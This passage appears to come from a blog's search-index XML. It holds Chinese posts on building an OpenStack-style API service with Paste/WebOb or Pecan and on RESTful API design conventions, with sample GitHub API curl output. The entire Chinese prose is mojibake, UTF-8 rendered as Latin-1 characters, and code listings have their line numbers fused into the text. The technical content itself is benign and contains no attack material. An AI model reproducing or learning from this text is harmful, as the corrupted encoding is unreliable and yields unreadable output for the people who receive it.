æ¯”å¦‚:æŽ¥ä¸‹æ¥æˆ‘ä»¬ä¼šä»¥demoçš„å½¢å¼å¼€å‘ä¸€ä¸ªå’ŒopenstackæœåŠ¡ç±»ä¼¼çš„æœåŠ¡ï¼Œè¯¥æœåŠ¡çš„åç§°å°±å«demo openstackä¸­çš„apiæœåŠ¡openstackçš„APIè®¾è®¡é£Žæ ¼ä¸ºRESTful, å¦‚ä½•è®¾è®¡RESTful APIæˆ‘åœ¨å‰é¢çš„åšå®¢ä¸­æœ‰ä»‹ç», Pythonçš„Webå¼€å‘æ¡†æž¶å¾ˆå¤šï¼ŒåŸºæœ¬ä¸Šï¼Œè¿˜æ´»è·ƒçš„æ¡†æž¶éƒ½æ”¯æŒRESTful APIçš„å¼€å‘, æœ‰äº›æ¡†æž¶è¿˜ä¸“é—¨ä¸ºRESTful APIçš„å¼€å‘æä¾›äº†ä¾¿åˆ©çš„åŠŸèƒ½,æ¯”å¦‚Pecanï¼Œæœ‰äº›æ¡†æž¶åˆ™é€šè¿‡ç¬¬ä¸‰æ–¹æ¨¡å—æ¥æä¾›è¿™ç§ä¾¿åˆ©ï¼Œæ¯”å¦‚Djangoå’ŒFlaskéƒ½æœ‰ä¸å°‘å’ŒRESTç›¸å…³çš„ç¬¬ä¸‰æ–¹åº“ã€‚å¯¹äºŽæ¡†æž¶é€‰æ‹©ï¼Œä¹Ÿæ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«å¥½çš„æ ‡å‡†ï¼Œä¸€èˆ¬éƒ½æ˜¯æ¯”è¾ƒæ€§èƒ½ã€æ–‡æ¡£ã€ç¤¾åŒºæ˜¯å¦æ´»è·ƒç­‰ã€‚åœ¨æˆ‘çœ‹æ¥ï¼Œé€‰æ‹©æµè¡Œçš„ä¸€èˆ¬å°±ä¸ä¼šé”™ä¸‹é¢æ˜¯openstack keystoneå…³äºŽcredentialçš„API: æ—©æœŸé¡¹ç›®çš„apiæœåŠ¡OpenStacké¡¹ç›®å€¾å‘äºŽä¸é‡æ–°å‘æ˜Žè½®å­ï¼Œä¸€èˆ¬éƒ½ä¼šé€‰æ‹©çŽ°æœ‰çš„åº“å’Œæ¡†æž¶æ¥ä½¿ç”¨ï¼Œé™¤éžçŽ°æœ‰çš„æ¡†æž¶ä¸æ»¡è¶³éœ€æ±‚ã€‚å› ä¸ºWebæ¡†æž¶çš„é€‰æ‹©å¾ˆå¤šï¼Œè€Œä¸”éƒ½æ»¡è¶³éœ€æ±‚ï¼Œæ‰€ä»¥OpenStacké¡¹ç›®åˆ°ç›®å‰ä¸ºæ­¢éƒ½æ˜¯ä½¿ç”¨çŽ°æˆçš„Webæ¡†æž¶ã€‚OpenStackæ—©æœŸçš„é¡¹ç›®å¹¶æ²¡æœ‰ä½¿ç”¨ä¸€ä¸ªæ¡†æž¶ï¼Œè€Œæ˜¯ä½¿ç”¨äº†å‡ ä¸ªä¸åŒçš„æ¨¡å—æ¥ç»„åˆå‡ºä¸€ä¸ªæ¡†æž¶ï¼šPaste + PasteDeploy + Routes + WebObï¼Œè¿™å‡ ä¸ªä¸åŒçš„æ¨¡å—åˆ†åˆ«è´Ÿè´£åº”ç”¨çš„WSGIåŒ–ã€URLè·¯ç”±å’Œè¯·æ±‚å¤„ç†ç­‰åŠŸèƒ½ã€‚Nova, Glance, Neutron, Keystoneç­‰æ—©æœŸçš„é¡¹ç›®éƒ½æ˜¯ä½¿ç”¨è¿™æ ·çš„æž¶æž„æ¥å®žçŽ°RESTful APIçš„ã€‚æ—©æœŸçš„è¿™ç§æŠ€æœ¯é€‰åž‹å¸¦æ¥çš„å¥½å¤„æ˜¯â€æ¡†æž¶â€å…·å¤‡è¶³å¤Ÿçš„çµæ´»æ€§ï¼Œç¼ºç‚¹åˆ™æ˜¯è¦æŠŠè¿™å‡ ä¸ªæ¨¡å—ç»„åˆèµ·æ¥å®žçŽ°ä¸€ä¸ªRESTæœåŠ¡ï¼Œéœ€è¦å†™å¾ˆå¤šä»£ç ï¼Œè¿žWSGIçš„å…¥å£å‡½æ•°éƒ½è¦è‡ªå·±å®žçŽ°ï¼ˆæ¯”å¦‚Keystoneé¡¹ç›®çš„keystone/common/wsgi.pyæ–‡ä»¶ä¸­çš„class Applicationï¼‰ã€‚å› ä¸ºçµæ´»æ€§çš„å¥½å¤„ä¸æ˜¯å¾ˆæ˜Žæ˜¾ï¼Œè€Œä»£ç é‡å¤§çš„åå¤„å¾ˆæ˜Žæ˜¾ï¼Œæ¯”å¦‚ä¸Šé¢é‚£ä¸ªclass Applicationéœ€è¦åœ¨æ¯ä¸ªé¡¹ç›®ä¸­å¤åˆ¶ä¸€éï¼Œæ‰€ä»¥ç¤¾åŒºçš„æ–°é¡¹ç›®å°±å¼€å§‹ä½¿ç”¨æ–°çš„Webæ¡†æž¶Pecan æ–°é¡¹ç›®çš„apiæœåŠ¡Pecanæ˜¯ä¸€ä¸ªåŸºäºŽå¯¹è±¡è·¯ç”±çš„æ¡†æž¶ï¼Œå³çµæ´»åˆç®€å•ã€‚Pecanä¸»è¦å®žçŽ°äº†URLè·¯ç”±åŠŸèƒ½ï¼Œæ”¯æŒRESTful APIã€‚Pecanæ²¡æœ‰å®žçŽ°æ¨¡æ¿ã€sessionç®¡ç†å’ŒORMç­‰åŠŸèƒ½ï¼Œä½†æ˜¯è¿™äº›åŠŸèƒ½å¯ä»¥é€šè¿‡å…¶ä»–çš„æ¨¡å—æ¥å®žçŽ°ã€‚å¯¹äºŽOpenStackæ¥è¯´ï¼ŒPecanæ˜¯ä¸€ä¸ªå¾ˆå¥½çš„é€‰æ‹©ï¼Œå› ä¸ºOpenStacké¡¹ç›®ä¸­ç»Ÿä¸€ä½¿ç”¨sqlalchemyæ¥å®žçŽ°ORMï¼ŒAPIçš„å®žçŽ°ä¹Ÿä¸éœ€è¦æ¨¡æ¿åŠŸèƒ½ï¼Œå®‰å…¨æŽ§åˆ¶åˆ™åŸºäºŽKeystoneä½“ç³»ã€‚ä½¿ç”¨Pecanæ¥å¼€å‘RESTæœåŠ¡ï¼Œä»£ç é‡å¾ˆå°‘ï¼Œä»£ç ç»“æž„ä¹Ÿæ¸…æ™°ã€‚Ceilometeré¡¹ç›®å°±æ˜¯ä½¿ç”¨äº†Pecan]]></content>
      <categories>
        <category>å¼€å‘è¯­è¨€</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>openstack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RESTful API è®¾è®¡è§„èŒƒ]]></title>
    <url>%2F2017%2F01%2F06%2Frest-api-design%2F</url>
    <content type="text"><![CDATA[åšå‡ºä¸€ä¸ªå¥½çš„APIè®¾è®¡å¾ˆéš¾ã€‚APIè¡¨è¾¾çš„æ˜¯ä½ çš„æ•°æ®å’Œä½ çš„æ•°æ®ä½¿ç”¨è€…ä¹‹é—´çš„å¥‘çº¦ï¼Œå› æ­¤APIçš„è®¾è®¡å¾€å¾€æ˜¯ç«™åœ¨ä½¿ç”¨è€…çš„è§’åº¦è¿›è¡Œçš„ï¼Œè€Œå…³äºŽRESTfulçš„ä»‹ç»å¯ä»¥å‚è€ƒé˜®ä¸€å³°çš„åšå®¢ç†è§£RESTfulæž¶æž„ , è¿™é‡ŒåŒæ—¶ä¹Ÿå‚è€ƒäº†ä»–çš„å¦ä¸€ç¯‡åšå®¢RESTful API è®¾è®¡æŒ‡å—åœ¨è¿™æ–¹é¢æœ‰ä¸€ç¯‡å¾ˆå‡ºåçš„æ–‡ç« ï¼Œè¿™é‡Œéœ€è¦ä½ è‡ªå·±è§£å†³ç¿»å¢™é—®é¢˜Principles of good RESTful API Design å®šä¹‰ è¿™é‡Œæœ‰ä¸€äº›éžå¸¸é‡è¦çš„æœ¯è¯­ï¼Œæˆ‘å°†åœ¨æœ¬æ–‡é‡Œé¢ä¸€ç›´ç”¨åˆ°å®ƒä»¬ èµ„æº(Resource)ï¼šä¸€ä¸ªå¯¹è±¡çš„å•ç‹¬å®žä¾‹ï¼Œå¦‚ä¸€åªåŠ¨ç‰© é›†åˆ(Collection)ï¼šä¸€ç¾¤åŒç§å¯¹è±¡ï¼Œå¦‚åŠ¨ç‰© HTTPï¼šè·¨ç½‘ç»œçš„é€šä¿¡åè®® å®¢æˆ·ç«¯(Consumer)ï¼šå¯ä»¥åˆ›å»ºHTTPè¯·æ±‚çš„å®¢æˆ·ç«¯åº”ç”¨ç¨‹åº ç¬¬ä¸‰æ–¹å¼€å‘è€…(Third Party Developer)ï¼šè¿™ä¸ªå¼€å‘è€…ä¸å±žäºŽä½ çš„é¡¹ç›®ä½†æ˜¯æœ‰æƒ³ä½¿ç”¨ä½ çš„æ•°æ® æœåŠ¡å™¨(Server)ï¼šä¸€ä¸ªHTTPæœåŠ¡å™¨æˆ–è€…åº”ç”¨ç¨‹åºï¼Œå®¢æˆ·ç«¯å¯ä»¥è·¨ç½‘ç»œè®¿é—®å®ƒ ç«¯ç‚¹(Endpoint)ï¼šè¿™ä¸ªAPIåœ¨æœåŠ¡å™¨ä¸Šçš„URLç”¨äºŽè¡¨è¾¾ä¸€ä¸ªèµ„æºæˆ–è€…ä¸€ä¸ªé›†åˆ å¹‚ç­‰(Idempotent)ï¼šæ— è¾¹é™…æ•ˆåº”ï¼Œå¤šæ¬¡æ“ä½œå¾—åˆ°ç›¸åŒçš„ç»“æžœ URLæ®µ(Segment)ï¼šåœ¨URLé‡Œé¢å·²æ–œæ åˆ†éš”çš„å†…å®¹ æ•°æ®è®¾è®¡ä¸ŽæŠ½è±¡ ç†æ¸…ä¸šåŠ¡æ•°æ®æµç¨‹ è§„åˆ’å¥½ä½ çš„APIçš„å¤–è§‚è¦å…ˆäºŽå¼€å‘å®ƒå®žé™…çš„åŠŸèƒ½ã€‚é¦–å…ˆä½ è¦çŸ¥é“æ•°æ®è¯¥å¦‚ä½•è®¾è®¡å’Œæ ¸å¿ƒæœåŠ¡/åº”ç”¨ç¨‹åºä¼šå¦‚ä½•å·¥ä½œ, è¿™éƒ¨åˆ†çš„å·¥ä½œ å¾€å¾€å°±æ˜¯éœ€è¦å†™å¥½ PRDå’ŒDRDè¿™äº›åŠŸèƒ½æ–‡æ¡£ ç«™åœ¨ä½¿ç”¨è€…çš„è§’åº¦è¿›è¡Œåˆç†æŠ½è±¡ æœ‰æ—¶å€™ä¸€ä¸ªé›†åˆå¯ä»¥è¡¨è¾¾ä¸€ä¸ªæ•°æ®åº“è¡¨ï¼Œè€Œä¸€ä¸ªèµ„æºå¯ä»¥è¡¨è¾¾æˆé‡Œé¢çš„ä¸€è¡Œè®°å½•ï¼Œä½†æ˜¯è¿™å¹¶ä¸æ˜¯å¸¸æ€ã€‚äº‹å®žä¸Šï¼Œä½ çš„APIåº”è¯¥å°½å¯èƒ½ é€šè¿‡æŠ½è±¡æ¥åˆ†ç¦»æ•°æ®ä¸Žä¸šåŠ¡é€»è¾‘ã€‚è¿™ç‚¹éžå¸¸é‡è¦ï¼Œåªæœ‰è¿™æ ·åšä½ æ‰ä¸ä¼šæ‰“å‡»åˆ°é‚£äº›æ‹¥æœ‰å¤æ‚ä¸šåŠ¡çš„ç¬¬ä¸‰æ–¹å¼€å‘è€…ï¼Œ å¦åˆ™ä»–ä»¬æ˜¯ä¸ä¼šä½¿ç”¨ä½ çš„APIçš„ã€‚ å¦‚ä½•å¼€æ”¾API å½“ç„¶ä½ çš„æœåŠ¡å¯èƒ½å¾ˆå¤šéƒ¨åˆ†æ˜¯ä¸åº”è¯¥é€šè¿‡APIæš´éœ²å‡ºåŽ»çš„ã€‚æ¯”è¾ƒå¸¸è§çš„ä¾‹å­å°±æ˜¯å¾ˆå¤šAPIæ˜¯ä¸å…è®¸ç¬¬ä¸‰æ–¹æ¥åˆ›å»ºç”¨æˆ·çš„ã€‚ HTTP åŠ¨è¯ä¸€ä¸ªå¥½çš„RESTful APIåªå…è®¸ç¬¬ä¸‰æ–¹è°ƒç”¨è€…ä½¿ç”¨è¿™å››ä¸ªåŠHTTPåŠ¨è¯è¿›è¡Œæ•°æ®äº¤äº’ï¼Œå¹¶ä¸”åœ¨URLæ®µé‡Œé¢ä¸å‡ºçŽ°ä»»ä½•å…¶ä»–çš„åŠ¨è¯ã€‚ä¸€èˆ¬æ¥è¯´ï¼ŒGETè¯·æ±‚å¯ä»¥è¢«æµè§ˆå™¨ç¼“å­˜ï¼ˆé€šå¸¸ä¹Ÿæ˜¯è¿™æ ·çš„ï¼‰ã€‚ä¾‹å¦‚ï¼Œç¼“å­˜è¯·æ±‚å¤´ç”¨äºŽç¬¬äºŒæ¬¡ç”¨æˆ·çš„POSTè¯·æ±‚ã€‚HEADè¯·æ±‚æ˜¯åŸºäºŽä¸€ä¸ªæ— å“åº”ä½“çš„GETè¯·æ±‚ï¼Œå¹¶ä¸”ä¹Ÿå¯ä»¥è¢«ç¼“å­˜çš„ã€‚ GET (é€‰æ‹©)ï¼šä»ŽæœåŠ¡å™¨ä¸ŠèŽ·å–ä¸€ä¸ªå…·ä½“çš„èµ„æºæˆ–è€…ä¸€ä¸ªèµ„æºåˆ—è¡¨ã€‚ POST ï¼ˆåˆ›å»ºï¼‰ï¼š åœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºä¸€ä¸ªæ–°çš„èµ„æºã€‚ PUT ï¼ˆæ›´æ–°ï¼‰ï¼šä»¥æ•´ä½“çš„æ–¹å¼æ›´æ–°æœåŠ¡å™¨ä¸Šçš„ä¸€ä¸ªèµ„æºã€‚ PATCH ï¼ˆæ›´æ–°ï¼‰ï¼šåªæ›´æ–°æœåŠ¡å™¨ä¸Šä¸€ä¸ªèµ„æºçš„ä¸€ä¸ªå±žæ€§ã€‚ DELETE ï¼ˆåˆ é™¤ï¼‰ï¼šåˆ é™¤æœåŠ¡å™¨ä¸Šçš„ä¸€ä¸ªèµ„æºã€‚ HEAD ï¼š èŽ·å–ä¸€ä¸ªèµ„æºçš„å…ƒæ•°æ®ï¼Œå¦‚æ•°æ®çš„å“ˆå¸Œå€¼æˆ–æœ€åŽçš„æ›´æ–°æ—¶é—´ã€‚ OPTIONSï¼šèŽ·å–å®¢æˆ·ç«¯èƒ½å¯¹èµ„æºåšä»€ä¹ˆæ“ä½œçš„ä¿¡æ¯ã€‚ åŸŸå åŸŸåæ˜¯ç”¨äºŽè®¿é—®ä½ çš„APIæœåŠ¡çš„ç¬¬ä¸€æ­¥ï¼Œå› æ­¤å¦‚ä½•åœ¨åŸŸåä¸Šè¡¨çŽ°è‡ªå·±æä¾›çš„API æœåŠ¡å–ƒï¼Œä»¥ä¸‹æœ‰2ç§æ–¹æ³• åº”è¯¥å°½é‡å°†APIéƒ¨ç½²åœ¨ä¸“ç”¨åŸŸåä¹‹ä¸‹ã€‚ å¦‚æžœç¡®å®šAPIå¾ˆç®€å•ï¼Œä¸ä¼šæœ‰è¿›ä¸€æ­¥æ‰©å±•ï¼Œå¯ä»¥è€ƒè™‘æ”¾åœ¨ä¸»åŸŸåä¸‹ã€‚ 12https://api.example.com # ä¸“ä¸šåŸŸåhttps://example.org/api/ # URIä¸­æ˜Žç¡®è¯´æ˜Ž ç‰ˆæœ¬åŒ– APIæ˜¯æœåŠ¡å™¨ä¸Žå®¢æˆ·ç«¯ä¹‹é—´çš„ä¸€ä¸ªå…¬å…±å¥‘çº¦ã€‚å¦‚æžœä½ å¯¹æœåŠ¡å™¨ä¸Šçš„APIåšäº†ä¸€ä¸ªæ›´æ”¹ï¼Œå¹¶ä¸”è¿™äº›æ›´æ”¹æ— æ³•å‘åŽå…¼å®¹ï¼Œ é‚£ä¹ˆä½ å°±æ‰“ç ´äº†è¿™ä¸ªå¥‘çº¦ï¼Œå®¢æˆ·ç«¯åˆä¼šè¦æ±‚ä½ é‡æ–°æ”¯æŒå®ƒã€‚ä¸ºäº†é¿å…è¿™æ ·çš„äº‹æƒ…ï¼Œä½ æ—¢è¦ç¡®ä¿åº”ç”¨ç¨‹åºé€æ­¥çš„æ¼”å˜ï¼Œ åˆè¦è®©å®¢æˆ·ç«¯æ»¡æ„ã€‚é‚£ä¹ˆä½ å¿…é¡»åœ¨å¼•å…¥æ–°ç‰ˆæœ¬APIçš„åŒæ—¶ä¿æŒæ—§ç‰ˆæœ¬APIä»ç„¶å¯ç”¨ã€‚ éšç€æ—¶é—´çš„æŽ¨ç§»ï¼Œä½ å¯èƒ½å£°æ˜Žä¸å†æ”¯æŒæŸäº›æ—§ç‰ˆæœ¬çš„APIã€‚ç”³æ˜Žä¸æ”¯æŒä¸€ä¸ªç‰¹æ€§å¹¶ä¸æ„å‘³ç€å…³é—­æˆ–è€…ç ´åå®ƒã€‚ è€Œæ˜¯å‘Šè¯‰å®¢æˆ·ç«¯æ—§ç‰ˆæœ¬çš„APIå°†åœ¨æŸä¸ªç‰¹å®šçš„æ—¶é—´è¢«åˆ é™¤ï¼Œå¹¶ä¸”å»ºè®®ä»–ä»¬ä½¿ç”¨æ–°ç‰ˆæœ¬çš„APIã€‚ å¦‚æžœä½ åªæ˜¯ç®€å•çš„å¢žåŠ ä¸€ä¸ªæ–°çš„ç‰¹æ€§åˆ°APIä¸Šï¼Œå¦‚èµ„æºä¸Šçš„ä¸€ä¸ªæ–°å±žæ€§æˆ–è€…å¢žåŠ ä¸€ä¸ªæ–°çš„ç«¯ç‚¹ï¼Œä½ ä¸éœ€è¦å¢žåŠ APIçš„ç‰ˆæœ¬ã€‚ å› ä¸ºè¿™äº›å¹¶ä¸ä¼šé€ æˆå‘åŽå…¼å®¹æ€§çš„é—®é¢˜ï¼Œä½ åªéœ€è¦ä¿®æ”¹æ–‡æ¡£å³å¯ã€‚ è¿™é‡Œå®žçŽ°æ–¹å¼æœ‰2ç§ï¼š åº”è¯¥å°†APIçš„ç‰ˆæœ¬å·æ”¾å…¥URL å°†ç‰ˆæœ¬å·æ”¾åœ¨HTTPå¤´ä¿¡æ¯ä¸­ï¼Œä½†ä¸å¦‚æ”¾å…¥URLæ–¹ä¾¿å’Œç›´è§‚, Githubé‡‡ç”¨çš„å°±æ˜¯è¿™ç§åšæ³• 1234567891011121314151617181920https://api.example.com/v1/ # åœ¨URLä¸­è¯´æ˜Žcurl -i https://api.github.com/users/octocat/orgs # HTTPå¤´ä¸­è¡¨ç¤ºAPIç‰ˆæœ¬ HTTP/1.1 200 OK Server: nginx Date: Fri, 12 Oct 2012 23:33:14 GMT Content-Type: application/json; charset=utf-8 Connection: keep-alive Status: 200 OK ETag: &quot;a00049ba79152d03380c34652f2cb612&quot; X-GitHub-Media-Type: github.v3 X-RateLimit-Limit: 5000 X-RateLimit-Remaining: 4987 X-RateLimit-Reset: 1350085394 Content-Length: 5 Cache-Control: max-age=0, private, must-revalidate X-Content-Type-Options: nosniff API ROOT URI APIçš„æ ¹åœ°å€å¾ˆé‡è¦ã€‚å¯ä»¥é€šè¿‡è¿™ä¸ªåˆ—è¡¨å¿«é€Ÿäº†è§£ä½ æä¾›çš„æœåŠ¡ï¼Œå› æ­¤ï¼Œè®©ä½ çš„APIæ ¹å…¥å£ç‚¹ä¿æŒå°½å¯èƒ½çš„ç®€å•ã€‚ä»¥githubçš„åˆ— 123456789101112131415161718192021222324252627282930313233maojun@maojun-mbp# curl https://api.github.com&#123; &quot;current_user_url&quot;: &quot;https://api.github.com/user&quot;, &quot;current_user_authorizations_html_url&quot;: &quot;https://github.com/settings/connections/applications&#123;/client_id&#125;&quot;, &quot;authorizations_url&quot;: &quot;https://api.github.com/authorizations&quot;, &quot;code_search_url&quot;: &quot;https://api.github.com/search/code?q=&#123;query&#125;&#123;&amp;page,per_page,sort,order&#125;&quot;, &quot;emails_url&quot;: &quot;https://api.github.com/user/emails&quot;, &quot;emojis_url&quot;: &quot;https://api.github.com/emojis&quot;, &quot;events_url&quot;: &quot;https://api.github.com/events&quot;, &quot;feeds_url&quot;: &quot;https://api.github.com/feeds&quot;, &quot;followers_url&quot;: &quot;https://api.github.com/user/followers&quot;, &quot;following_url&quot;: &quot;https://api.github.com/user/following&#123;/target&#125;&quot;, &quot;gists_url&quot;: &quot;https://api.github.com/gists&#123;/gist_id&#125;&quot;, &quot;hub_url&quot;: &quot;https://api.github.com/hub&quot;, &quot;issue_search_url&quot;: &quot;https://api.github.com/search/issues?q=&#123;query&#125;&#123;&amp;page,per_page,sort,order&#125;&quot;, &quot;issues_url&quot;: &quot;https://api.github.com/issues&quot;, &quot;keys_url&quot;: &quot;https://api.github.com/user/keys&quot;, &quot;notifications_url&quot;: &quot;https://api.github.com/notifications&quot;, &quot;organization_repositories_url&quot;: &quot;https://api.github.com/orgs/&#123;org&#125;/repos&#123;?type,page,per_page,sort&#125;&quot;, &quot;organization_url&quot;: &quot;https://api.github.com/orgs/&#123;org&#125;&quot;, &quot;public_gists_url&quot;: &quot;https://api.github.com/gists/public&quot;, &quot;rate_limit_url&quot;: &quot;https://api.github.com/rate_limit&quot;, &quot;repository_url&quot;: &quot;https://api.github.com/repos/&#123;owner&#125;/&#123;repo&#125;&quot;, &quot;repository_search_url&quot;: &quot;https://api.github.com/search/repositories?q=&#123;query&#125;&#123;&amp;page,per_page,sort,order&#125;&quot;, &quot;current_user_repositories_url&quot;: &quot;https://api.github.com/user/repos&#123;?type,page,per_page,sort&#125;&quot;, &quot;starred_url&quot;: &quot;https://api.github.com/user/starred&#123;/owner&#125;&#123;/repo&#125;&quot;, &quot;starred_gists_url&quot;: &quot;https://api.github.com/gists/starred&quot;, &quot;team_url&quot;: &quot;https://api.github.com/teams&quot;, &quot;user_url&quot;: &quot;https://api.github.com/users/&#123;user&#125;&quot;, &quot;user_organizations_url&quot;: &quot;https://api.github.com/user/orgs&quot;, &quot;user_repositories_url&quot;: &quot;https://api.github.com/users/&#123;user&#125;/repos&#123;?type,page,per_page,sort&#125;&quot;, &quot;user_search_url&quot;: &quot;https://api.github.com/search/users?q=&#123;query&#125;&#123;&amp;page,per_page,sort,order&#125;&quot;&#125; Endpoints ä¸€ä¸ªç«¯ç‚¹å°±æ˜¯æŒ‡å‘ç‰¹å®šèµ„æºæˆ–èµ„æºé›†åˆçš„URLã€‚é’ˆå¯¹æ¯ä¸€ä¸ªç«¯ç‚¹æ¥è¯´ï¼Œä½ å¯èƒ½æƒ³åˆ—å‡ºæ‰€æœ‰å¯è¡Œçš„HTTPåŠ¨è¯å’Œç«¯ç‚¹çš„ç»„åˆã€‚ åœ¨RESTfulæž¶æž„ä¸­ï¼Œæ¯ä¸ªç½‘å€ä»£è¡¨ä¸€ç§èµ„æºï¼ˆresourceï¼‰ï¼Œæ‰€ä»¥ç½‘å€ä¸­ä¸èƒ½æœ‰åŠ¨è¯ï¼Œåªèƒ½æœ‰åè¯ï¼Œ è€Œä¸”æ‰€ç”¨çš„åè¯å¾€å¾€ä¸Žæ•°æ®åº“çš„è¡¨æ ¼åå¯¹åº”ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œæ•°æ®åº“ä¸­çš„è¡¨éƒ½æ˜¯åŒç§è®°å½•çš„ â€œé›†åˆâ€ï¼ˆcollectionï¼‰ï¼Œæ‰€ä»¥APIä¸­çš„åè¯ä¹Ÿåº”è¯¥ä½¿ç”¨å¤æ•°ã€‚ è¯·æ³¨æ„å¦‚ä½•å±•ç¤ºæ•°æ®ä¹‹é—´çš„å…³ç³»ï¼Œç‰¹åˆ«æ˜¯é›‡å‘˜ä¸ŽåŠ¨ç‰©å›­ä¹‹é—´çš„å¤šå¯¹å¤šå…³ç³»ã€‚é€šè¿‡æ·»åŠ ä¸€ä¸ªé¢å¤–çš„URLæ®µå°±å¯ä»¥å®žçŽ°æ›´å¤šçš„äº¤äº’èƒ½åŠ›ã€‚ å½“ç„¶æ²¡æœ‰ä¸€ä¸ªHTTPåŠ¨è¯èƒ½è¡¨ç¤ºæ­£åœ¨è§£é›‡ä¸€ä¸ªäººï¼Œä½†æ˜¯ä½ å¯ä»¥ä½¿ç”¨DELETEä¸€ä¸ªåŠ¨ç‰©å›­é‡Œçš„é›‡å‘˜æ¥è¾¾åˆ°ç›¸åŒçš„æ•ˆæžœã€‚ 1234567891011121314151617https://api.example.com/v1/zooshttps://api.example.com/v1/animalshttps://api.example.com/v1/animal_typeshttps://api.example.com/v1/employeesGET /zoos: List all Zoos (ID and Name, not too much detail)POST /zoos: Create a new ZooGET /zoos/ZID: Retrieve an entire Zoo objectPUT /zoos/ZID: Update a Zoo (entire object)PATCH /zoos/ZID: Update a Zoo (partial object)DELETE /zoos/ZID: Delete a ZooGET /zoos/ZID/animals: Retrieve a listing of Animals (ID and Name).GET /animals: List all Animals (ID and Name).POST /animals: Create a new AnimalGET /animals/AID: Retrieve an Animal objectPUT /animals/AID: Update an Animal (entire object)PATCH /animals/AID: Update an Animal (partial object) è¿‡æ»¤å’ŒæŽ’åº ä½¿ç”¨è¿‡æ»¤å’ŒæŽ’åºæœ‰å¤šç§åŽŸå› ï¼Œå› æ­¤APIåº”è¯¥æä¾›å‚æ•°ï¼Œè¿‡æ»¤å’ŒæŽ’åºè¿”å›žç»“æžœï¼Œé™ä½Žå®¢æˆ·ç«¯çš„å¤æ‚åº¦ã€‚ å¦‚æžœè®°å½•æ•°é‡å¾ˆå¤šï¼ŒæœåŠ¡å™¨ä¸å¯èƒ½éƒ½å°†å®ƒä»¬è¿”å›žç»™ç”¨æˆ·ã€‚ ä»Žå®¢æˆ·ç«¯çš„è§’åº¦æ¥è¯´ï¼Œæœ€å°åŒ–ç½‘ç»œä¼ è¾“ï¼Œå¹¶è®©å®¢æˆ·ç«¯å°½å¯èƒ½å¿«çš„å¾—åˆ°æŸ¥è¯¢ç»“æžœã€‚ ä»ŽæœåŠ¡å™¨è§’åº¦æ¥è¯´ï¼Œå“åº”è¯·æ±‚è¶Šå°è´Ÿè½½å°±è¶Šå°ã€‚ 1234?limit=10: å‡å°‘è¿”å›žç»™å®¢æˆ·ç«¯çš„ç»“æžœæ•°é‡ï¼ˆç”¨äºŽåˆ†é¡µï¼‰?offset=10: å‘é€ä¸€å †ä¿¡æ¯ç»™å®¢æˆ·ç«¯ï¼ˆç”¨äºŽåˆ†é¡µï¼‰?animal_type_id=1: ä½¿ç”¨æ¡ä»¶åŒ¹é…æ¥è¿‡æ»¤è®°å½•?sortby=name&amp;order=asc: å¯¹ç»“æžœæŒ‰ç‰¹å®šå±žæ€§è¿›è¡ŒæŽ’åº çŠ¶æ€ç  æœåŠ¡å™¨å‘ç”¨æˆ·è¿”å›žçš„çŠ¶æ€ç å’Œæç¤ºä¿¡æ¯ï¼Œå› ä¸ºå®ƒä»¬æ˜¯HTTPçš„æ ‡å‡†ï¼Œæ‰€ä»¥é€šç”¨æ€§ä¸Šæœ‰ä¿è¯ï¼Œ çŠ¶æ€ç çš„å®Œæ•´å®šä¹‰è¯·çœ‹HTTP1.1/rfc Status Code define 1234567891011121314151617181920çŠ¶æ€ç èŒƒå›´è¯´æ˜Žï¼š1xxï¼šä¿ç•™ç»™åº•å±‚HTTPåŠŸèƒ½ä½¿ç”¨çš„ï¼Œå¹¶ä¸”ä¼°è®¡åœ¨ä½ çš„èŒä¸šç”Ÿæ¶¯é‡Œé¢ä¹Ÿç”¨ä¸ç€æ‰‹åŠ¨å‘é€è¿™æ ·ä¸€ä¸ªçŠ¶æ€ç å‡ºæ¥ã€‚2xxï¼šä¿ç•™ç»™æˆåŠŸæ¶ˆæ¯ä½¿ç”¨çš„ï¼Œä½ å°½å¯èƒ½çš„ç¡®ä¿æœåŠ¡å™¨æ€»å‘é€è¿™äº›çŠ¶æ€ç ç»™ç”¨æˆ·ã€‚3xxï¼šä¿ç•™ç»™é‡å®šå‘ç”¨çš„ã€‚å¤§å¤šæ•°çš„APIä¸ä¼šå¤ªå¸¸ä½¿ç”¨è¿™ç±»çŠ¶æ€ç ï¼Œä½†æ˜¯åœ¨æ–°çš„è¶…åª’ä½“æ ·å¼çš„APIä¸­ä¼šä½¿ç”¨æ›´å¤šä¸€äº›ã€‚4xxï¼šä¿ç•™ç»™å®¢æˆ·ç«¯é”™è¯¯ç”¨çš„ã€‚ä¾‹å¦‚ï¼Œå®¢æˆ·ç«¯æä¾›äº†ä¸€äº›é”™è¯¯çš„æ•°æ®æˆ–è¯·æ±‚äº†ä¸å­˜åœ¨çš„å†…å®¹ã€‚è¿™äº›è¯·æ±‚åº”è¯¥æ˜¯å¹‚ç­‰çš„ï¼Œä¸ä¼šæ”¹å˜ä»»ä½•æœåŠ¡å™¨çš„çŠ¶æ€ã€‚5xxï¼šä¿ç•™ç»™æœåŠ¡å™¨ç«¯é”™è¯¯ç”¨çš„ã€‚è¿™äº›é”™è¯¯å¸¸å¸¸æ˜¯ä»Žåº•å±‚çš„å‡½æ•°æŠ›å‡ºæ¥çš„ï¼Œå¹¶ä¸”å¼€å‘äººå‘˜ä¹Ÿé€šå¸¸æ²¡æ³•å¤„ç†ã€‚å‘é€è¿™ç±»çŠ¶æ€ç çš„ç›®çš„æ˜¯ç¡®ä¿å®¢æˆ·ç«¯èƒ½å¾—åˆ°ä¸€äº›å“åº”ã€‚æ”¶åˆ°5xxå“åº”åŽï¼Œå®¢æˆ·ç«¯æ²¡åŠžæ³•çŸ¥é“æœåŠ¡å™¨ç«¯çš„çŠ¶æ€ï¼Œæ‰€ä»¥è¿™ç±»çŠ¶æ€ç æ˜¯è¦å°½å¯èƒ½çš„é¿å…ã€‚å¸¸è§çš„ä¸€äº›çŠ¶æ€ç ï¼š200 OK - [GET]ï¼šæœåŠ¡å™¨æˆåŠŸè¿”å›žç”¨æˆ·è¯·æ±‚çš„æ•°æ®ï¼Œè¯¥æ“ä½œæ˜¯å¹‚ç­‰çš„ï¼ˆIdempotentï¼‰ã€‚201 CREATED - 